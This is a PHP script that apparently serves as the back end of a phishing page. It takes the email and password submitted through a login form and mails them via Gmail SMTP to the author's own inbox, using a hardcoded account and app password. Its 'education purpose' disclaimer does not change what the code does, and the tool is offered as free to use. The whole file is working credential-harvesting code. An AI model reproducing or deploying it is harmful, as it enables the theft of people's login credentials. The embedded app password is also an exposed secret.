<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

// Include PHPMailer dependencies
require 'phpmailer/src/Exception.php';
require 'phpmailer/src/PHPMailer.php';
require 'phpmailer/src/SMTP.php';

// Get email and password from the form
$email = $_POST['email']; // Assuming 'email' is the name attribute in your email input field
$password = $_POST['password']; // Assuming 'password' is the name attribute in your password input field

// Create an instance of PHPMailer
$mail = new PHPMailer(true);

try {
    // Server settings
    $mail->SMTPDebug = SMTP::DEBUG_SERVER;
    $mail->isSMTP();
    $mail->Host       = 'smtp.gmail.com';
    $mail->SMTPAuth   = true;
    $mail->Username   = 'mr.babluj0@gmail.com'; // Your Gmail Id
    $mail->Password   = 'gqif usyk hsyo doag'; // Your App password
    $mail->SMTPSecure = 'tls';
    $mail->Port       = 587;

    // Recipients
    $mail->setFrom('mr.babluj0@gmail.com', 'mr.bablu');
    $mail->addAddress('mr.babluj0@gmail.com', 'mr.bablu');

    // Email content
    $mail->isHTML(true);
    $mail->Subject = 'INFOGATH - Login Info';

    $gifLink = 'https://media0.giphy.com/media/l71kleRwrkxxK/giphy.gif?cid=6c09b9520frs9j1zwlcik4k9n8h2rodv1we7czwpoljvldbn&ep=v1_internal_gif_by_id&rid=giphy.gif&ct=g'; // Replace with your actual GIF link

    $body = "<html><body style='font-family: Arial, sans-serif;'>";
    $body .= "<p style='margin-bottom: 20px; border-bottom: 2px solid #000;'>Subject: INFOGATH This is only for education purpose. Data is safe and secure in the database.</p>";
    $body .= "<p style='margin-top: 20px; margin-bottom: 20px; border-bottom: 2px solid #000;'>Email: $email <br> Password: $password</p>";
    $body .= "<img src='$gifLink' alt='GIF' style='margin-top: 20px; border: 2px solid #000;'>";
    $body .= "<p style='margin-top: 20px; border-top: 2px solid #000;'>THIS TOOL IS FREE TO USE DEVELOPED BY MUHAMMAD ALI</p>";
    $body .= "</body></html>";

    $mail->Body = $body;

    // Send the email
    $mail->send();
    echo 'Message has been sent';
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}
?>
